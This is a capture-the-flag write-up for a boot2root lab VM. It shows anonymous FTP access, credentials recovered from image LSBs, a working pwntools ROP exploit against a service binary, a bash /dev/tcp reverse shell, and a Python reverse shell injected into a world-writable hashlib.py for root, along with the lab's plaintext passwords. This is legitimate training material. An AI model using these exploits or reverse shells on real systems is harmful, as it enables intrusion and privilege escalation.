# Sai's Boot2Root - Writeup

This is a writeup of the intended solution if you are struggling / don't have enough time to spend fully solving my challenge. My answer to cyber1 is on here at `/root/AnswerCyber1.txt` which is only accessible once this box is rooted. 

You can see some of the work put into this box under `/home/warwick/Desktop/` or under logs for the `warwick` user.

Check the end of this page to find the solution TL;DR / summary.

**<u>Unintended solutions (because you have access to the box yourself):</u>**

* Edit GRUB config for this machine and boot to recovery as root.



## Running Instructions

Unzip the file

Open the vm (I used vmware), with network adapter in bridging mode or setup a new network.

Make sure you can access the ip address from an external machine and you can start the pentest from there.



## Foothold

#### FTP Anonymous User

Nmap'ing the machine with default settings reveals:

```bash
$ sudo nmap -sC -sV 192.168.0.64
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-23 15:39 EDT
Stats: 0:00:01 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Nmap scan report for 192.168.0.64
Host is up (0.0011s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Oct 21 20:47 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.0.61
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b4:4b:54:f9:92:91:cf:aa:fd:44:13:63:ee:71:a6:ed (RSA)
|   256 55:7a:23:10:d9:73:a6:91:69:f0:cc:7f:38:07:1c:5d (ECDSA)
|_  256 7d:d2:e7:39:20:be:a1:c8:dc:ac:b6:60:c0:74:27:c8 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.12 seconds


```

The SSH version is not vulnerable, but it looks like vsFTPd 3.0.3 allows anonymous login. 

After you try this, you see a singular png file in `ftp://192.168.0.64/pub/`

```bash
$ ftp 192.168.0.64
Connected to 192.168.0.64.
220 (vsFTPd 3.0.3)
Name (192.168.0.64:kali): anonymous 
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Oct 21 20:47 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp        406730 Oct 21 20:43 watdis.png
226 Directory send OK.
ftp> get watdis.png
local: watdis.png remote: watdis.png
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for watdis.png (406730 bytes).
226 Transfer complete.
406730 bytes received in 0.01 secs (48.5649 MB/s)
```

#### Steganography

Trying steghide on this image doesn't work, but if you look at the Least Significant Bits, you can string together the hidden message:

```python
import numpy as np
from PIL import Image

img = np.array(Image.open('filename.png'))

message = ''
for row in range(img.shape[0]):
	for pixel in range(img.shape[1]):
		message += str(img[row, pixel][0] & 1)

s = [int(message[i:i+8], 2) for i in range(0, len(message), 8)]
print(bytearray(s)[:100])
```

Running the script gives

```python
bytearray(b'     Credentials - tWatson:WarwickEpic123       \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x04\x04\x04\x04\x08nL\xac\x8c\xad\xce\x8d,-\x8ed\x05\xa4\x0e\x8a\xec.\x8em\xed\xc7J\xec.N\xed,')

```

## Pivot

#### Looking around

Logging in with ssh allows you to access `tWatson`'s account

```bash
ssh tWatson@192.168.0.64
tWatson@192.168.0.64's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

4 packages can be updated.
3 updates are security updates.

Last login: Thu Oct 22 15:21:13 2020 from 192.168.0.61
tWatson@ubuntu:~$ 
```

Changing directory to `~/Desktop` reveals two files. 

```bash
tWatson@ubuntu:~$ cd Desktop/
tWatson@ubuntu:~/Desktop$ ls
echoToolBackup  user.txt
tWatson@ubuntu:~/Desktop$ cat user.txt
Damn! I found this tool lying around on Peter Norris' workspace and took a look at it. There's something wrong with it, I can just smell it ...
```

You cannot run `echoToolBackup`, but can download it and run it locally

```bash
$ scp tWatson@192.168.0.64:~/Desktop/echoToolBackup .
tWatson@192.168.0.64's password: 
echoToolBackup												100% 6296   375.0KB/s   00:00

$ chmod +x ./echoToolBackup
$ ./echoToolBackup
Input something
test
Wowwww graape!
```

After looking around a bit more, you should notice that there is an interesting service running on TCP localhost:6666 as `pNorris`.

```bash
tWatson@ubuntu:~/Desktop$ netstat -pelt
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name    
...
tcp        0      0 localhost:6666          0.0.0.0:*               LISTEN      pNorris    27203      -                   
...        

```

Connecting to this service reveals that it is the `echoTool`

```
tWatson@ubuntu:~/Desktop$ nc localhost 6666
test
Input something
Wowwww graape!
```

#### Analyzing the binary

This binary seems to have been stripped from looking at it with the `file` tool.

```bash
$ file ./echoToolBackup
echoToolBackup: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=b1f941c97a87ef57f0a5b35e108c9862de4f68c2, stripped
```

This binary has these permissions enabled

```bash
$ checksec ./echoToolBackup
[*] './echoToolBackup'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

You can throw the binary in radare2 to analyze it or use Ghidra. I will show the process using radare2 as it is easier to copy and paste.

```c
$ r2 echoToolBackup 
[0x00400520]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[0x00400520]> afl
0x00400520    1 42           entry0
0x004004d0    1 6            sym.imp.puts
0x004004e0    1 6            sym.imp.read
0x004004f0    1 6            sym.imp.fflush
0x00400500    1 6            sym.imp.setgid
0x00400510    1 6            sym.imp.setuid
0x00400607    1 91           main
0x00400600    5 119  -> 62   entry.init0
0x004005d0    3 34   -> 29   entry.fini0
0x00400560    4 42   -> 37   fcn.00400560
0x004004a8    3 23           fcn.004004a8
```

Radare detects some imported functions and 2 random functions. So let's look at `main`.

```asm
[0x00400520]> s main
[0x00400607]> pdf
            ; DATA XREF from entry0 @ 0x40053d
┌ 91: int main (int argc, char **argv, char **envp);
│           ; var void *buf @ rbp-0x4
│           0x00400607      55             push rbp
│           0x00400608      4889e5         mov rbp, rsp
│           0x0040060b      4883ec10       sub rsp, 0x10
│           0x0040060f      bf00000000     mov edi, 0                  ; FILE *stream
│           0x00400614      e8d7feffff     call sym.imp.fflush         ; int fflush(FILE *stream)
│           0x00400619      bfea030000     mov edi, 0x3ea              ; 1002
│           0x0040061e      e8edfeffff     call sym.imp.setuid
│           0x00400623      bfea030000     mov edi, 0x3ea              ; 1002
│           0x00400628      e8d3feffff     call sym.imp.setgid
│           0x0040062d      488d3dc00000.  lea rdi, qword str.Input_something ; 0x4006f4 ; "Input something" ; const char *s
│           0x00400634      e897feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00400639      488d45fc       lea rax, qword [buf]
│           0x0040063d      ba00010000     mov edx, 0x100              ; rdx ; size_t nbyte
│           0x00400642      4889c6         mov rsi, rax                ; void *buf
│           0x00400645      bf00000000     mov edi, 0                  ; int fildes
│           0x0040064a      e891feffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
│           0x0040064f      488d3dae0000.  lea rdi, qword str.Wowwww_graape ; 0x400704 ; "Wowwww graape!" ; const char *s
│           0x00400656      e875feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0040065b      b801000000     mov eax, 1
│           0x00400660      c9             leave
└           0x00400661      c3             ret

```

Since the stack is only 16 bytes due to the `sub rsp, 0x10`, but the `read` function is reading 256 bytes due to `mov edx, 0x100` (which is the third argument because of the calling convention), there is a stack overflow.

Therefore, to exploit this binary, because NX is enabled we need to use two ROP chains. One chain is necessary to leak an address in `libc.so.6` and another to call system. To do this, we can call puts@PLT with any GOT function to leak its address as it gets dereferenced. The simplest way to do this is to do `puts@PLT(puts@GOT)`. Next we need to re-run the main function and call system with a pointer to /bin/sh as an argument: `system((char **)0x..ptr to "/bin/sh"..)`. Due to the calling convention for 64bit binaries, we need to use a `pop rdi`  gadget. Searching for this reveals one quickly:

```assembly
$ ROPGadget --binary ./echoToolBackup | grep "pop rdi"
0x00000000004006d3 : pop rdi ; ret
```

However, due to some stack alignment issues in calling system, sometimes it is required to include an additional `ret` gadget, which can be found as easily

```assembly
$ ROPGadget --binary ./echoToolBackup | grep "ret"
0x00000000004004be : ret
```

To calculate offsets in libc.so.6, you can use both `readelf` and `strings`.

```bash
# Finding which libc is used
$ ldd ./echoToolBackup 
        linux-vdso.so.1 (0x00007ffcb81b0000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f65d104d000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f65d143e000)

# puts offset
$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "puts"
   ...
   422: 0000000000080a30   512 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5

# system offset
$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "system"
  ...
  1403: 000000000004f4e0    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5

# /bin/sh\x00" offset
$ strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
 1b40fa /bin/sh
```

Now we have enough to construct the chains and the following exploit script is produced

```python
from pwn import *
import sys

exe = "./echoToolBackup"
elf = ELF(exe)
proc = remote('127.0.0.1', 6666)

pop_rdi = 0x4006d3
ret	= 0x4004be

# Libc offsets
system_offset = 0x04f4e0
binsh_offset  = 0x1b40fa
puts_offset   = 0x080a30

# puts@PLT(puts@GOT)
payload  = "a" * 12
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts']) 
payload += p64(0x400607) # main
proc.sendline(payload)

data = proc.recv()
data = data.splitlines()[2]
data = unpack(data, 'all')

# Calculating offsets
libc_base = data - puts_offset
system    = libc_base + system_offset
binsh     = libc_base + binsh_offset

log.info("Leaked puts@glibc       : 0x%x" % data)
log.info("Calculated glibc        : 0x%x" % libc_base)
log.info("Calculated system@glibc : 0x%x" % system)
log.info("Calculated /bin/sh@glibc: 0x%x" % binsh)
log.info("Executing shell ... type any command")

# system(ptr to /bin/sh in glibc)
payload  = "a"*12
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(ret)
payload += p64(system)
proc.send(payload)

# PROFIT
proc.interactive()
```


After running it successfully, you should basically drop into a semi-interactive shell

```bash
tWatson@ubuntu:~/Desktop$ python ./exploit.py 
[*] '/home/tWatson/Desktop/echoToolBackup'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 127.0.0.1 on port 6666: Done
[*] Leaked puts@glibc       : 0x7f8e2ca8ca30
[*] Calculated glibc        : 0x7f8e2ca0c000
[*] Calculated system@glibc : 0x7f8e2ca5b4e0
[*] Calculated /bin/sh@glibc: 0x7f8e2cbc00fa
[*] Executing shell ... type any command
[*] Switching to interactive mode
$ id
uid=1002(pNorris) gid=1002(pNorris) groups=1002(pNorris)
$ cd Desktop
$ ls -la
total 28
drwxr-x---  3 pNorris pNorris 4096 Oct 22 14:18 .
drwxr-x--- 10 pNorris pNorris 4096 Oct 22 15:09 ..
-rwxr-x---  1 root    pNorris 8560 Oct 22 13:54 echoTool
drwxr-x---  2 pNorris pNorris 4096 Oct 22 14:59 script
-rw-r--r--  1 root    root     142 Oct 22 14:18 user2.txt
$ cat user2.txt
I know I've misplaced my ROP binary for tomorrow's class somewhere ...

Oh well. I need to get on with the work for next week's python class!
```

From here you can either drop your public sshkey into `~/.ssh/authorized_keys` or pop a reverse shell using `/bin/bash -c "/bin/bash -i >& /dev/tcp/<LOCALIP>/<LOCALPORT> 0>&1"`. I will assume you have logged in as pNorris henceforth.

## Root

Looking in the `script` directory, you see two files

```bash
pNorris@ubuntu:~/Desktop$ cd script/

pNorris@ubuntu:~/Desktop/script$ ls -la
total 16
drwxr-x--- 2 pNorris pNorris 4096 Oct 22 14:59 .
drwxr-x--- 3 pNorris pNorris 4096 Oct 22 14:18 ..
-rw-r----- 1 pNorris pNorris  132 Oct 23 21:48 md5.txt
-rwxr-x--- 1 pNorris pNorris  760 Oct 22 14:59 osExample.py

pNorris@ubuntu:~/Desktop/script$ cat md5.txt 
799567384a8d1e84d70a7191bdabcc5f
e17dcd154150359ec4a863bc0d85fafe
0fa3bc55c19638f955c9ef9317aeb306
efde389eeb45c90a78369b39221a63ca
```

```python
pNorris@ubuntu:~/Desktop/script$ cat osExample.py 
#!/usr/bin/env python
import os 
import time
import hashlib

# Lesson one:
# Python for Linux - os library
md5_file  = "/home/pNorris/Desktop/script/md5.txt"
downloads = "/home/pNorris/Downloads/" 

# Changes directory (equivalent to cd)
os.chdir(downloads)
# Lists the files and folders of the current working directory
# Equivalent to ls `pwd`
files = os.listdir(os.getcwd())
hashes = []

# Loop over each filename 
for filename in files:
    # Open file and read it
    with open(filename, 'rb') as f:
        # Hash the file contents
        # Append the hex string to list
        hashes.append(hashlib.md5(f.read()).hexdigest())

# Open the md5 file and write each hash to it
with open(md5_file, 'w') as f:
    for h in hashes:
        f.write(h + '\n')
```

Since the `md5.txt` was written pretty recently, I decided to watch the file.

```bash
$ watch 'date; ls -la'
Fri 23 Oct 21:50:09 BST 2020
total 16
drwxr-x--- 2 pNorris pNorris 4096 Oct 22 14:59 .
drwxr-x--- 3 pNorris pNorris 4096 Oct 22 14:18 ..
-rw-r----- 1 pNorris pNorris  132 Oct 23 21:50 md5.txt
-rwxr-x--- 1 pNorris pNorris  760 Oct 22 14:59 osExample.py
...
Fri 23 Oct 21:51:03 BST 2020
total 16
drwxr-x--- 2 pNorris pNorris 4096 Oct 22 14:59 .
drwxr-x--- 3 pNorris pNorris 4096 Oct 22 14:18 ..
-rw-r----- 1 pNorris pNorris  132 Oct 23 21:51 md5.txt
-rwxr-x--- 1 pNorris pNorris  760 Oct 22 14:59 osExample.py
```

From this you can infer that the osExample.py is run every minute.  This notion can be further reinforced by  using the `pspy` tool

```bash
$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
$ chmod +x ./pspy
$ ./pspy
...
2020/10/23 21:55:01 CMD: UID=0    PID=4147   | /usr/sbin/CRON -f 
2020/10/23 21:55:01 CMD: UID=0    PID=4148   | 
2020/10/23 21:55:01 CMD: UID=0    PID=4149   | python /home/pNorris/Desktop/script/osExample.py 
...
```

The interesting point to notice is that the script is run by `UID=0` who is `root`. This means if we find an exploit in the script, we can gain access to the root account.

The first thing you should look at is the python path, and so any writeable files in the path.

```bash
pNorris@ubuntu:~/Desktop/script$ python
Python 2.7.17 (default, Sep 30 2020, 13:38:04) 
[GCC 7.5.0] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import sys
>>> sys.path
['', '/usr/lib/python2.7', '/usr/lib/python2.7/plat-x86_64-linux-gnu', '/usr/lib/python2.7/lib-tk', '/usr/lib/python2.7/lib-old', '/usr/lib/python2.7/lib-dynload', '/usr/local/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages', '/usr/lib/python2.7/dist-packages/gtk-2.0']

$ cd /usr/lib/python2.7
$ find . -perm /o+w
./dist-packages/lsb_release.py
./config-x86_64-linux-gnu/libpython2.7.so
./hashlib.py
./sitecustomize.py
```

Since the `hashlib.py` is world-writable, we can just input our own script into it and gain access to root!

```python
# $Id$
#
#  Copyright (C) 2005   Gregory P. Smith (greg@krypto.org)
#  Licensed to PSF under a Contributor Agreement.
#

import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);

__doc__ = """hashlib module - A common interface to many hash functions.
...
```

This just pops a local reverse shell, which when gets executed and you are listening on TCP port 1234, you get a root shell.

```bash
tWatson@ubuntu:~$ nc -lvnp 1234
Listening on [0.0.0.0] (family 0, port 1234)
Connection from 127.0.0.1 54440 received!
# id
uid=0(root) gid=0(root) groups=0(root)
# cd
# ls
AnswerCyber1.txt
root.txt
# cat root.txt
You're not supposed to be here >:(

Since you are here read: /root/AnswerCyber1.txt
```



# Solution / TL;DR

FTP Anonymous User

LSB Steg -> Creds user 1

```
* tWatson:WarwickEpic123
```

ROP Chain, leak libc call system -> User 2

Overwrite hashlib library and include a reverse shell -> root

### Creds:

- tWatson:WarwickEpic123
- pNorris:CyberSecurityBestDegree123
- warwick:NeverGuessThis (sudoer)

